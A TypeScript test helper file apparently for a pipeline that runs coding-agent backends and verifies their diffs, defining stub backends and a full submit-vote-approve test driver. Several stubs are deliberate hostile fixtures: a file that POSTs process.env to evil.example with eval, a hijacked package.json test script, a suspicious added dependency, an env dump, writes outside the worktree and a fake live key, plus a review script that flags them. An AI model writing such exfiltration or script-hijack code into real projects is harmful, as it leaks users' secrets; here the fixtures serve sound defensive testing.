import * as store from "./store";
import {
  api,
  buildTestApp,
  makeRepo,
  makeUser,
  setFixture,
  waitForRun,
  type FixtureRepo,
  type TestApp,
} from "./testutil";

/** Read the task spec from stdin, then act. All backends are real shell.
 * Uses `node -e` (not a stdin heredoc: node consumes heredoc stdin as the
 * program itself, so the program's own stdin reads never fire). */
function shQuote(s: string): string {
  return "'" + s.replace(/'/g, `'"'"'`) + "'";
}
export function nodeStdin(body: string): string {
  const script = `let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{${body}});`;
  return `node -e ${shQuote(script)}`;
}

/** Implements a small feature with tests, reports a cost. */
export const GOOD_BACKEND = nodeStdin(`
  const fs=require('fs');
  fs.writeFileSync('theme.js','module.exports={dark:true};\\n');
  fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
  console.log('WISHSHIP_COST: 1.84');
`);

/** Appends a secret-shaped line to a new file. */
export const SECRET_BACKEND = nodeStdin(`
  const fs=require('fs');
  fs.writeFileSync('leak.js','const key = "sk_live_abcdefghijklmnop";\\n');
`);

/** Adds a dependency to package.json. */
export const DEP_BACKEND = nodeStdin(`
  const fs=require('fs');
  const pkg=JSON.parse(fs.readFileSync('package.json','utf8'));
  pkg.dependencies = Object.assign({}, pkg.dependencies, {'evil-pkg': '^9.9.9'});
  fs.writeFileSync('package.json', JSON.stringify(pkg, null, 2));
`);

/** Adds an exfiltration-looking file plus a small related change. The test
 * file passes on purpose: probe 10 is about flags firing DESPITE green
 * tests, which is the realistic backdoor shape. */
export const BACKDOOR_BACKEND = nodeStdin(`
  const fs=require('fs');
  fs.writeFileSync('evil.js',"fetch('https://evil.example/collect',{method:'POST',body:JSON.stringify(process.env)});eval('1');\\n");
  fs.writeFileSync('theme.js','module.exports={dark:true};\\n');
  fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
`);

/** Backdoor with a keyword comment: the old churn rule (any single
 * token overlap, comments included) let this pass as related. */
export const BACKDOOR_COMMENT_BACKEND = nodeStdin(`
  const fs=require('fs');
  fs.writeFileSync('evil.js',"// dark mode toggle\\nfetch('https://evil.example/collect',{method:'POST',body:JSON.stringify(process.env)});eval('1');\\n");
  fs.writeFileSync('theme.js','module.exports={dark:true};\\n');
  fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
`);

/** New network call inside a RELATED file: flagged, not blocking. */
export const RELATED_FETCH_BACKEND = nodeStdin(`
  const fs=require('fs');
  fs.writeFileSync('theme.js','module.exports={dark:true};fetch("https://api.example/ping").catch(()=>{});\\n');
  fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
`);

/** Rewrites package.json's test script to a planting no-op. */
export const SCRIPT_REWRITE_BACKEND = nodeStdin(`
  const fs=require('fs');
  const pkg=JSON.parse(fs.readFileSync('package.json','utf8'));
  pkg.scripts.test = "node -e \\"require('fs').writeFileSync('pwned.txt','pwned')\\"";
  fs.writeFileSync('package.json', JSON.stringify(pkg, null, 2));
  fs.writeFileSync('theme.js','module.exports={dark:true};\\n');
  fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
`);

/** Produces a diff over the default 500-line limit. */
export const BIG_BACKEND = nodeStdin(`
  const fs=require('fs');
  fs.writeFileSync('big.js', Array.from({length:600},(_,i)=>'const x'+i+' = '+i+';').join('\\n'));
`);

/** Two unrelated large files plus one small related file: churn BLOCKED. */
export const CHURN_BACKEND = nodeStdin(`
  const fs=require('fs');
  fs.writeFileSync('unrelated-a.js', Array.from({length:100},(_,i)=>'// zzz '+i).join('\\n'));
  fs.writeFileSync('unrelated-b.js', Array.from({length:100},(_,i)=>'// yyy '+i).join('\\n'));
  fs.writeFileSync('theme.js','module.exports={dark:true};\\n');
`);

/** Exits 0 having changed nothing. */
export const EMPTY_BACKEND = "exit 0";

/** Sleeps past any short test timeout. */
export const SLEEP_BACKEND = "sleep 90";

/** Pipe-holding descendant: must NOT stall execution past the timeout. */
export const PIPEHOLD_BACKEND = "(sleep 30 &); echo done";

/** Dumps the agent env into the diff so tests can assert scrubbing.
 * Compact single-line JSON: a pretty-printed dump would be a large
 * unrelated file and (correctly) trip the churn block. */
export const ENV_BACKEND = nodeStdin(`
  const fs=require('fs');
  fs.writeFileSync('env.json', JSON.stringify(process.env));
`);

/** Writes outside the worktree (sibling of the worktree dir). */
export const OUTSIDE_BACKEND = "echo hi > ../outside-write.txt";

/** Writes outside the worktree AND makes a small related change. */
export const OUTSIDE_PLUS_BACKEND =
  "echo hi > ../outside-write.txt; echo 'module.exports={dark:true};' > theme.js";

/** Reports a missing repo capability. */
export const NEEDS_INPUT_BACKEND = "echo 'WISHSHIP_NEEDS_INPUT: repo has no usable harness'; exit 1";

/** Like GOOD_BACKEND but reports a cost above a small cap. */
export const COSTLY_BACKEND = nodeStdin(`
  const fs=require('fs');
  fs.writeFileSync('theme.js','module.exports={dark:true};\\n');
  fs.writeFileSync('theme.test.js','const t=require("./theme");if(!t.dark)process.exit(1);\\n');
  console.log('WISHSHIP_COST: 5.00');
`);

/** Review script: flags exfil hosts and eval in the diff (advisory). */
export const REVIEW_BACKEND = nodeStdin(`
  const input=JSON.parse(s);
  if (input.diff.includes('evil.example')) console.log('new outbound call to unfamiliar host evil.example');
  if (input.diff.includes('eval(')) console.log('dynamic code loading via eval');
`);

export interface DriveOpts {
  fullName: string;
  fixture: FixtureRepo;
  backend: string;
  review?: string | null;
  wishTitle: string;
  wishBody: string;
  voterCount?: number;
  configOverrides?: Partial<store.RepoConfig>;
  appConfigOverrides?: Record<string, unknown>;
  /** Extra fields merged into the approve payload (e.g. allowChurn). */
  approveExtras?: Record<string, unknown>;
}

/** Full loop: submit, vote, close cycle, approve, run to terminal state. */
export async function drivePipeline(t: TestApp, opts: DriveOpts): Promise<{
  repo: store.Repo;
  wish: store.Wish;
  winnerId: string;
  run: store.Run;
  report: store.VerificationReport | null;
  pr: store.Pr | null;
}> {
  setFixture(t, opts.fixture.dir);
  const repo = await makeRepo(t.pool, opts.fullName, opts.configOverrides ?? {});
  const maintainer = await makeUser(t.pool, { login: "maya-maintainer" });
  t.github.seedRepo(repo.full_name);
  t.github.maintainers.get(repo.full_name)!.add(maintainer.login);
  const submit = await api(t, "POST", `/api/repos/${repo.id}/wishes`, {
    user: maintainer,
    payload: { title: opts.wishTitle, body: opts.wishBody },
  });
  if (submit.status !== 201) throw new Error(`submit failed: ${JSON.stringify(submit.body)}`);
  const wish = submit.body.wish as store.Wish;
  const voters = opts.voterCount ?? 4;
  for (let i = 0; i < voters; i++) {
    const voter = await makeUser(t.pool, { login: `voter-${opts.fullName.replace(/[^a-z]/g, "")}-${i}` });
    const v = await api(t, "POST", `/api/wishes/${wish.id}/vote`, { user: voter });
    if (v.status !== 200) throw new Error(`vote failed: ${JSON.stringify(v.body)}`);
  }
  await store.openCycle(t.pool, repo.id);
  const closed = await api(t, "POST", `/api/repos/${repo.id}/cycles/close`, { user: maintainer });
  if (closed.status !== 200) throw new Error(`close failed: ${JSON.stringify(closed.body)}`);
  const winnerId = closed.body.winner.id as string;
  const approved = await api(t, "POST", `/api/winners/${winnerId}/approve`, {
    user: maintainer,
    payload: { backend: "script", ...(opts.approveExtras ?? {}) },
  });
  if (approved.status !== 200) throw new Error(`approve failed: ${JSON.stringify(approved.body)}`);
  const runId = approved.body.run.id as string;
  const run = await waitForRun(t, runId);
  return {
    repo,
    wish,
    winnerId,
    run,
    report: await store.getReportByRun(t.pool, runId),
    pr: await store.getPrByRun(t.pool, runId),
  };
}

export { buildTestApp };
